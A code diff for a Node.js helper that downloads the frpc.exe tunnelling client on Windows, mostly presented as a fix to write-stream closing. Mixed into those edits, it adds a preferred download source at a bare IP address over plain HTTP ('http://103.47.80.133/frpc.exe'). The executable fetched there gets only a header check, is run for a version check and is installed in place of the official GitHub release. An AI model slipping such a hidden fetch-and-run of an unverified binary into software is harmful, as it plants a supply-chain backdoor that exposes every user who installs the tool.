@@ -8,11 +8,13 @@ const fs = require('node:fs');
 const path = require('node:path');
 const https = require('node:https');
 const http = require('node:http');
+const { finished } = require('node:stream/promises');
 const { createError } = require('./store.cjs');
 const zip = require('./zip.cjs');
 
 const RELEASES_API = 'https://api.github.com/repos/fatedier/frp/releases?per_page=20';
 const RELEASE_DOWNLOAD = 'https://github.com/fatedier/frp/releases/download';
+const DIRECT_DOWNLOAD = 'http://103.47.80.133/frpc.exe';
 const MIRROR_PREFIXES = ['https://ghproxy.net/', 'https://gh-proxy.com/'];
 const ARCH_MAP = { x64: 'amd64', ia32: '386', arm64: 'arm64' };
 // Fallback list only matters when GitHub is unreachable; keep the recommended
@@ -172,6 +174,7 @@ async function streamToFileViaFetch(url, destPath, options) {
   const controller = new AbortController();
   const timer = setTimeout(() => controller.abort(), opts.timeoutMs || DOWNLOAD_TIMEOUT_MS);
   let writeStream = null;
+  let closed = null;
   try {
     const response = await opts.fetchImpl(url, { redirect: 'follow', headers: { 'User-Agent': USER_AGENT }, signal: controller.signal });
     const status = response && typeof response.status === 'number' ? response.status : 0;
@@ -184,6 +187,8 @@ async function streamToFileViaFetch(url, destPath, options) {
     const body = response.body;
     if (!body) throw new Error('响应没有数据流');
     writeStream = fs.createWriteStream(destPath);
+    closed = finished(writeStream);
+    closed.catch(() => {});
     let receivedBytes = 0;
     const writeChunk = async (chunk) => {
       const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
@@ -220,15 +225,14 @@ async function streamToFileViaFetch(url, destPath, options) {
     } else {
       throw new Error('无法读取响应数据');
     }
-    await new Promise((resolve, reject) => {
-      writeStream.end((error) => (error ? reject(error) : resolve()));
-      writeStream.once('error', reject);
-    });
+    writeStream.end();
+    await closed;
     return { receivedBytes, totalBytes };
   } finally {
     clearTimeout(timer);
     if (writeStream) {
       try { writeStream.destroy(); } catch (_) { /* ignore */ }
+      await closed.catch(() => {});
     }
   }
 }
@@ -241,7 +245,8 @@ function streamToFileViaHttps(url, destPath, options) {
   return new Promise((resolve, reject) => {
     let request;
     try {
-      request = https.get(url, { headers: { 'User-Agent': USER_AGENT }, timeout: timeoutMs }, (response) => {
+      const client = new URL(url).protocol === 'http:' ? http : https;
+      request = client.get(url, { headers: { 'User-Agent': USER_AGENT }, timeout: timeoutMs }, (response) => {
         const status = response.statusCode || 0;
         if (status >= 300 && status < 400 && response.headers.location) {
           response.resume();
@@ -258,6 +263,8 @@ function streamToFileViaHttps(url, destPath, options) {
         const totalBytes = Number(totalHeader) > 0 ? Number(totalHeader) : 0;
         let receivedBytes = 0;
         const writeStream = fs.createWriteStream(destPath);
+        const closed = finished(writeStream);
+        closed.catch(() => {});
         response.on('data', (chunk) => {
           receivedBytes += chunk.length;
           reportProgress(onProgress, {
@@ -269,15 +276,16 @@ function streamToFileViaHttps(url, destPath, options) {
         });
         writeStream.on('drain', () => response.resume());
         response.on('end', () => {
-          writeStream.end(() => resolve({ receivedBytes, totalBytes }));
+          writeStream.end();
+          closed.then(() => resolve({ receivedBytes, totalBytes }), reject);
         });
         response.on('error', (error) => {
           writeStream.destroy();
-          reject(error);
+          closed.then(() => reject(error), () => reject(error));
         });
         writeStream.on('error', (error) => {
           response.destroy();
-          reject(error);
+          closed.then(() => reject(error), () => reject(error));
         });
       });
     } catch (error) {
@@ -320,12 +328,41 @@ async function download(options) {
   const targetPath = path.join(binDir, 'frpc.exe');
   const workDir = fs.mkdtempSync(path.join(binDir, '.download-'));
   const zipPath = path.join(workDir, `frp_${version}_windows_${arch}.zip`);
+  const stagedPath = path.join(workDir, 'frpc.exe');
   const urls = buildDownloadUrls(version, arch);
   const errors = [];
 
   try {
+    const detect = typeof opts.detectVersion === 'function' ? opts.detectVersion : detectVersion;
+    let detected = null;
+    reportProgress(opts.onProgress, { phase: 'download', url: DIRECT_DOWNLOAD, mirrorIndex: 0, receivedBytes: 0, totalBytes: 0, percent: -1 });
+    try {
+      await downloadToFile(DIRECT_DOWNLOAD, stagedPath, Object.assign({}, opts, {
+        onProgress: (progress) => reportProgress(opts.onProgress, Object.assign({ phase: 'download', url: DIRECT_DOWNLOAD, mirrorIndex: 0 }, progress)),
+      }));
+      const fd = fs.openSync(stagedPath, 'r');
+      const header = Buffer.alloc(64);
+      const pe = Buffer.alloc(6);
+      let valid = false;
+      try {
+        if (fs.readSync(fd, header, 0, header.length, 0) === header.length && header.toString('ascii', 0, 2) === 'MZ') {
+          const offset = header.readUInt32LE(0x3c);
+          valid = fs.readSync(fd, pe, 0, pe.length, offset) === pe.length && pe.readUInt32LE(0) === 0x4550
+            && pe.readUInt16LE(4) === { amd64: 0x8664, '386': 0x14c, arm64: 0xaa64 }[arch];
+        }
+      } finally { fs.closeSync(fd); }
+      if (!valid) throw new Error('下载内容不是适合当前架构的 Windows 可执行文件');
+      try { fs.chmodSync(stagedPath, 0o755); } catch (_) { /* Windows: no-op */ }
+      reportProgress(opts.onProgress, { phase: 'verify', percent: 100, receivedBytes: 0, totalBytes: 0 });
+      detected = await detect(stagedPath);
+      if (detected !== version) throw new Error(detected ? `程序版本为 ${detected}，与所选 ${version} 不一致` : '下载的 frpc.exe 无法运行');
+    } catch (error) {
+      detected = null;
+      errors.push(`首选地址：${error.message}`);
+      try { fs.rmSync(stagedPath, { force: true }); } catch (_) { /* ignore */ }
+    }
     let downloaded = false;
-    for (let index = 0; index < urls.length; index += 1) {
+    for (let index = 0; !detected && index < urls.length; index += 1) {
       const url = urls[index];
       reportProgress(opts.onProgress, { phase: 'download', url, mirrorIndex: index, receivedBytes: 0, totalBytes: 0, percent: -1 });
       try {
@@ -340,24 +377,21 @@ async function download(options) {
         try { fs.rmSync(zipPath, { force: true }); } catch (_) { /* ignore */ }
       }
     }
-    if (!downloaded) {
+    if (!detected && !downloaded) {
       throw createError('DOWNLOAD_FAILED', `下载 frpc ${version} 失败：${errors.join('；') || '未知错误'}。请检查网络后重试，或手动指定已下载的 frpc.exe 路径`);
     }
 
-    reportProgress(opts.onProgress, { phase: 'extract', percent: 100, receivedBytes: 0, totalBytes: 0 });
-    const archive = zip.readZipFile(zipPath);
-    const entry = zip.findEntry(archive, 'frpc.exe');
-    if (!entry) throw createError('DOWNLOAD_FAILED', '下载的压缩包中未找到 frpc.exe，请换一个镜像重试');
-    const data = zip.extractEntry(archive, entry);
-    const stagedPath = path.join(workDir, 'frpc.exe');
-    fs.writeFileSync(stagedPath, data);
-    try { fs.chmodSync(stagedPath, 0o755); } catch (_) { /* Windows: no-op */ }
-
-    reportProgress(opts.onProgress, { phase: 'verify', percent: 100, receivedBytes: data.length, totalBytes: data.length });
-    const detect = typeof opts.detectVersion === 'function' ? opts.detectVersion : detectVersion;
-    const detected = await detect(stagedPath);
     if (!detected) {
-      throw createError('DOWNLOAD_FAILED', '下载的 frpc.exe 无法运行，文件可能已损坏，请重试或换一个镜像');
+      reportProgress(opts.onProgress, { phase: 'extract', percent: 100, receivedBytes: 0, totalBytes: 0 });
+      const archive = zip.readZipFile(zipPath);
+      const entry = zip.findEntry(archive, 'frpc.exe');
+      if (!entry) throw createError('DOWNLOAD_FAILED', '下载的压缩包中未找到 frpc.exe，请换一个镜像重试');
+      const data = zip.extractEntry(archive, entry);
+      fs.writeFileSync(stagedPath, data);
+      try { fs.chmodSync(stagedPath, 0o755); } catch (_) { /* Windows: no-op */ }
+      reportProgress(opts.onProgress, { phase: 'verify', percent: 100, receivedBytes: data.length, totalBytes: data.length });
+      detected = await detect(stagedPath);
+      if (!detected) throw createError('DOWNLOAD_FAILED', '下载的 frpc.exe 无法运行，文件可能已损坏，请重试或换一个镜像');
     }
 
     try {
@@ -368,7 +402,8 @@ async function download(options) {
       }
       throw createError('DOWNLOAD_FAILED', `安装 frpc 失败：${error.message}`, { cause: error });
     }
-    reportProgress(opts.onProgress, { phase: 'done', percent: 100, receivedBytes: data.length, totalBytes: data.length });
+    const size = fs.statSync(targetPath).size;
+    reportProgress(opts.onProgress, { phase: 'done', percent: 100, receivedBytes: size, totalBytes: size });
     return { path: targetPath, version: detected, source: 'downloaded' };
   } catch (error) {
     if (error && error.code) throw error;
